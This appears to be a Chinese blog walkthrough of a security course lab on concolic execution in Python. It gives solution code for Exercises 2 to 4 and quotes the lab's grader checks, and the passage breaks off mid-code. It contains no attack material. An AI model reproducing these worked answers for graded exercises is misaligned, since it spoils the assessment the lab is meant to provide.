Finish the implementation of <code>concolic_int</code> by adding support for integer multiply and divide operations. You will need to overload additional methods in the <code>concolic_int</code> class (see the documentation for <a href="https://docs.python.org/3/library/operator.html">operator functions in Python 3</a>), add AST nodes for multiply and divide operations, and implement <code>_z3expr</code> appropriately for those AST nodes.</p><p>Look for the comments <code>Exercise 2: your code here</code> in <code>symex/fuzzy.py</code> to find places where we think you might need to write code to solve this exercise.</p><p>Run <strong>.&#x2F;check-concolic-int.py</strong> or <strong>make check</strong> to check that your changes to <code>concolic_int</code> work correctly.</p></blockquote><p>我们首先实现符号变量乘除所需的 <code>sym_binop</code> 子类，这里我们参照前面的加减运算直接调用 <code>z3expr()</code> 来返回 Z3 表达式即可</p><p>需要注意的是虽然 python 的除法运算有 <code>/</code> 与 <code>//</code>两种，但是 Z3并不支持 <code>ArithRef</code> 与 <code>int</code> 直接进行 <code>//</code> 运算，所以这里我们只实现一个普通的乘法即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement AST nodes for division and multiplication.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_mul</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) * z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_div</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) / z3expr(self.b)<br></code></pre></td></tr></table></figure><p>接下来我们重写 <code>concolic_int</code> 的乘法与除法，我们先参考一下 <code>concolic_int </code>中的加法运算方式：、</p><ul><li>首先判断运算对象是否为 <code>concolic_int</code> ，若是则将自身具体值加上对象具体值，否则直接加上该对象，结果存放到 <code>res</code></li><li>创建一个新的 <code>concolic_int</code> 实例作为返回值，<code>res</code> 作为其具体值部分，创建两个 <code>ast</code> 实例并利用 <code>sym_plus()</code> 计算结果作为新 concolic_int 的符号值部分</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v + o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v + o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_plus(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>那么我们的乘除法其实依葫芦画瓢即可，这里需要注意的是我们要同时实现 <code>/</code> 与 <code>//</code> 两种除法运算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement symbolic division and multiplication.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v * o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v * o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_mul(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__truediv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v / o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v / o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__floordiv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v // o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v // o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 2：</p><p><img src="https://s2.loli.net/2022/12/18/TBNqmRi5fVsFlCk.png" alt="image.png"></p><p>然后是 Exercise 3，主要是让我们熟悉混合执行系统的使用方式，这里提供的途径是修改 <code>symex_exercises.py</code> 以给予测试系统正确的输入：</p><blockquote><p><strong>Exercise 3.</strong> An important component of concolic execution is <code>concolic_exec_input()</code> in <code>symex/fuzzy.py</code>. We have given you the implementation. You will use it to build a complete concolic execution system. To understand how to use <code>concolic_exec_input()</code>, you should create an input such that you pass the first check in <code>symex/check-symex-int.py</code>. Don’t modify <code>symex/check-symex-int.py</code> directly, but instead modify <code>symex_exercises.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>混合执行框架的核心组件便是 <code>symex/fuzzy.py</code>  中的  <code>concolic_exec_input()</code> ，题目说后续我们将用其实现一个完整的混合执行系统，那我们先来看其相关的具体实现</p><h3 id="混合执行框架代码浅析-Part-2"><a href="#混合执行框架代码浅析-Part-2" class="headerlink" title="混合执行框架代码浅析  - Part 2"></a>混合执行框架代码浅析  - Part 2</h3><h4 id="VI-具体值字典-ConcreteValues"><a href="#VI-具体值字典-ConcreteValues" class="headerlink" title="VI.具体值字典 - ConcreteValues"></a>VI.具体值字典 - ConcreteValues</h4><p>如前文所言，在混合执行下被测试的程序输入都存储在一个全局字典中，实为一个<code>ConctreteValues</code> 类对象，实际上就是 python 字典的一个 wrapper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ConcreteValues maintains a dictionary of variables name to values.</span><br><span class="hljs-comment"># If a variable is created and it doesn&#x27;t exist, we use a default</span><br><span class="hljs-comment"># value for the variable (0 for int and &#x27;&#x27; for string).</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteValues</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.concrete_values = &#123;&#125;<br></code></pre></td></tr></table></figure><p>在 <code>symex/fuzzy.py</code> 中有一个全局变量 <code>current_concrete_values</code>，实际上就是我们前面所说的全局具体值字典，我们可以使用<code>ConctreteValues.mk_global()</code> 使该对象变为全局引用，即我们每次使用只需要创建一个<code>ConctreteValues</code> 对象即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># During concolic execution, new variables will be added to</span><br><span class="hljs-comment"># current_concrete_values, which is an instance of ConcreteValues.</span><br><span class="hljs-comment"># This variable is global because application code, the concolic</span><br><span class="hljs-comment"># Execution engine, and test code, all create new variables.  We make</span><br><span class="hljs-comment"># it global so that we don&#x27;t have to modify application code.  At the</span><br><span class="hljs-comment"># start of a concolic execution we will set this variable to the</span><br><span class="hljs-comment"># concrete values to be used.</span><br><br>current_concrete_values=<span class="hljs-literal">None</span><br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">global</span> current_concrete_values<br>    current_concrete_values = self<br></code></pre></td></tr></table></figure><p>在该类中有三个查询字典内 id 对应具体值并返回混合值的函数，若 id 不在字典内则进行添加，同时在 <code>symex/fuzzy.py</code> 中带有三个对这些函数的 wrapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_int(sym_int(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_str(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_bytes(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br><span class="hljs-comment">#...</span><br><br><span class="hljs-comment"># Wrapper functions to allow application code to create new</span><br><span class="hljs-comment"># variables. They will be added to the current global current</span><br><span class="hljs-comment"># concrete values.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_int(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_str(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_bytes(<span class="hljs-built_in">id</span>, initval)<br></code></pre></td></tr></table></figure><p>除了上面的函数以外，也可以直接使用 <code>add()</code> 成员函数来向字典内添加映射：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, v</span>):<br>  self.concrete_values[<span class="hljs-built_in">id</span>] = v<br></code></pre></td></tr></table></figure><p>以及还有一个 <code>canonical_rep()</code> 成员函数用以返回字典中的键值对元组排序列表，以及 <code>var_names()</code> 用以返回 id 列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical_rep</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(self.concrete_values.items())<br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">var_names</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.concrete_values.keys()<br></code></pre></td></tr></table></figure><p>以及一个 <code>inherit()</code> 成员函数用以从另一个字典中拷贝键值对：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> o.concrete_values:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = o.concrete_values[<span class="hljs-built_in">id</span>]<br></code></pre></td></tr></table></figure><h4 id="VII-concolic-exec-input-输入执行"><a href="#VII-concolic-exec-input-输入执行" class="headerlink" title="VII. concolic_exec_input() - 输入执行"></a>VII. concolic_exec_input() - 输入执行</h4><p>该函数内容用以根据给予的字典对传入的函数进行执行，整体逻辑比较简单：</p><ul><li>初始化两个全局空列表 <code>cur_path_constr</code> （<strong>当前路径的条件约束</strong>）与 <code>cur_path_constr_callers</code>（当前路径的信息）</li><li>调用 <code>concrete_values.mk_global()</code> 使其成为一个全局字典</li><li>调用传入的函数指针来获得一个值 <code>v</code>，若参数 <code>verbose &gt; 1</code> 则打印两个列表的内容</li><li>最后的返回值为 <code>(v, cur_path_constr, cur_path_constr_callers)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolically execute testfunc with the given concrete_values. It</span><br><span class="hljs-comment"># returns the value testfunc computes for the given concrete_values</span><br><span class="hljs-comment"># and the branches it encountered to compute that result.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_exec_input</span>(<span class="hljs-params">testfunc, concrete_values, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr = []<br>  cur_path_constr_callers = []<br>    <br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying concrete value:&#x27;</span>, concrete_values)<br><br>  <span class="hljs-comment"># make the concrete_value global so that new variables created</span><br>  <span class="hljs-comment"># by testfunc(), directly or indirectly, will be added to</span><br>  <span class="hljs-comment"># concrete_values.</span><br>  concrete_values.mk_global()<br>  v = testfunc()<br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Test generated&#x27;</span>, <span class="hljs-built_in">len</span>(cur_path_constr), <span class="hljs-string">&#x27;branches:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> (c, caller) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cur_path_constr, cur_path_constr_callers):<br>      <span class="hljs-built_in">print</span>(indent(z3expr(c)), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%s:%d&#x27;</span> % (caller[<span class="hljs-number">0</span>], caller[<span class="hljs-number">1</span>]))<br><br>  <span class="hljs-keyword">return</span> (v, cur_path_constr, cur_path_constr_callers)<br></code></pre></td></tr></table></figure><p>可以看到在该函数中并没有更改路径约束与信息的列表，实际上这在 <code>add_constr()</code> 中完成，该函数在 <code>concolic_bool()</code> 中调用，将约束信息进行添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constr</span>(<span class="hljs-params">e</span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr.append(simplify(e))<br>  cur_path_constr_callers.append(get_caller())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_bool</span>(<span class="hljs-params">sym, v</span>):<br>  <span class="hljs-comment">## Python claims that &#x27;bool&#x27; is not an acceptable base type,</span><br>  <span class="hljs-comment">## so it seems difficult to subclass bool.  Luckily, bool has</span><br>  <span class="hljs-comment">## only two possible values, so whenever we get a concolic</span><br>  <span class="hljs-comment">## bool, add its value to the constraint.</span><br>  add_constr(sym_eq(sym, ast(v)))<br>  <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>而 <code>concolic_bool()</code> 实际上在 <code>concolic_int</code> 与 <code>concolic_str</code> 的运算符重载中进行调用，这也是为什么每次执行 <code>concolic_exec_input()</code> 都要<strong>重新将路径约束与信息列表清空</strong>的缘故，这里以 <code>concolic_int </code>中的 <code>__cmp__</code> 运算符为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__cmp__</span>(<span class="hljs-params">self, o</span>):<br>  res = <span class="hljs-built_in">int</span>(self.__v).__cmp__(<span class="hljs-built_in">int</span>(o))<br>  <span class="hljs-keyword">if</span> concolic_bool(sym_lt(ast(self), ast(o)), res &lt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> concolic_bool(sym_gt(ast(self), ast(o)), res &gt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><p>我们接下来来看  <code>symex_exercises.py</code>  里有啥，主要就一个 <code>make_a_test()</code> 函数，我们需要在其中完成全局具体值字典 <code>concrete_values</code> 的构建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>那么我们该如何修改   <code>symex_exercises.py</code> 中创建的字典呢？我们先看一下 Exercise 3 的评判标准，在 <code>check_lab3.py</code> 中检测的是运行 <code>check-symex-int.py</code> 后要输出 <code>&quot;Found input for 1234&quot;</code> 字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_symex_int</span>():<br>    sh(<span class="hljs-string">&#x27;python3 check-symex-int.py &gt;/tmp/lab3.log&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Found input for 1234&#x27;</span> <span class="hljs-keyword">in</span> file_read(<span class="hljs-string">&#x27;/tmp/lab3.log&#x27;</span>):<br>        log(green(<span class="hljs-string">&quot;PASS&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log(red(<span class="hljs-string">&quot;FAIL&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们接下来来看  <code>check-symex-int.py</code> ，其开头的逻辑如下，<code>r</code> 的值为 1234 即可通过 Exercise 3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This test case checks that you provided the right input in symex_exercises.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling f with a specific input..&#x27;</span>)<br>v = symex_exercises.make_a_test_case()<br>(r, constr, callers) = fuzzy.concolic_exec_input(test_f, v, verbose=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> r == <span class="hljs-number">1234</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found input for 1234&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input produced&quot;</span>, r, <span class="hljs-string">&quot;instead of 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>如前面我们对 <code>concolic_exec_input()</code> 的分析，<code>r</code> 的值由传入的函数指针决定，故我们来看 <code>test_f()</code> 的逻辑，主要就是用 <code>mk_int()</code> 从全局具体值字典中获取 id 为 <code>i</code> 的值传入 <code>f()</code> 中进行运算，若不存在 <code>i</code> 则 <code>i</code> 会被默认赋值 <code>0</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == x+<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">80</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == <span class="hljs-number">1000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">33</span><br>    <span class="hljs-keyword">if</span> x // <span class="hljs-number">123</span> == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1234</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    i = fuzzy.mk_int(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br>    v = f(i)<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>由函数 <code>f()</code> 我们可以知道的是我们只需要向具体值字典中添加一个 <code>i = 123 * 7</code> 的值即可让 <code>test_f()</code> 返回 <code>1234</code>，故修改 <code>symex_exercises.py</code> 如下，这里用 <code>mk_int()</code> 和 <code>add()</code> 都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  concrete_values.add(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">123</span> * <span class="hljs-number">7</span>)<br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 3：</p><p><img src="https://s2.loli.net/2022/12/18/f3HsgQFum1CZDij.png" alt="image.png"></p><p>接下来是 Exercise 4，完成 <code>symex/fuzzy.py</code> 中 <code>concolic_find_input</code>  的实现：</p><blockquote><p><strong>Exercise 4.</strong> Another major component in concolic execution is finding a concrete input for a constraint. Complete the implementation of <code>concolic_find_input</code> in <code>symex/fuzzy.py</code> and make sure you pass the second test case of <code>symex/check-symex-int.py</code>. For this exercise, you will have to invoke Z3, along the lines of <code>(ok, model) = fork_and_check(constr)</code> (see the comments in the code). Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>在该函数当中我们需要完成对约束的求解并返回对应的结果，因此这里需要使用 Z3 求解器来完成约束求解过程，不过这里已经将调用 Z3 的流程在 <code>fork_and_check()</code> 中完成封装，我们只需要调用该函数进行求解即可，那么我们先来看  <code>fork_and_check()</code> 的具体实现：</p><ul><li>创建子进程调用 <code>fork_and_check_worker()</code> 进行约束求解，父子进程通过管道通信</li><li>父进程等待子进程的 <code>SIGALRM</code> 信号，若 <code>z3_timeout</code> 秒后未收到，杀死子进程</li><li>从管道接收结果并返回，若超时（子进程被杀，管道关闭）则返回 <code>(z3.unknown, None)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Support for forking because z3 uses lots of global variables</span><br><br><span class="hljs-comment">## timeout for Z3, in seconds</span><br>z3_timeout = <span class="hljs-number">5</span><br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check</span>(<span class="hljs-params">constr</span>):<br>  constr = simplify(constr)<br><br>  parent_conn, child_conn = multiprocessing.Pipe()<br>  p = multiprocessing.Process(target=fork_and_check_worker,<br>                              args=(constr, child_conn))<br>  p.start()<br>  child_conn.close()<br><br>  <span class="hljs-comment">## timeout after a while..</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">sighandler</span>(<span class="hljs-params">signo, stack</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Timed out..&quot;</span>)<br>    <span class="hljs-comment"># print z3expr(constr).sexpr()</span><br>    p.terminate()<br><br>  signal.signal(signal.SIGALRM, sighandler)<br>  signal.alarm(z3_timeout)<br><br>  <span 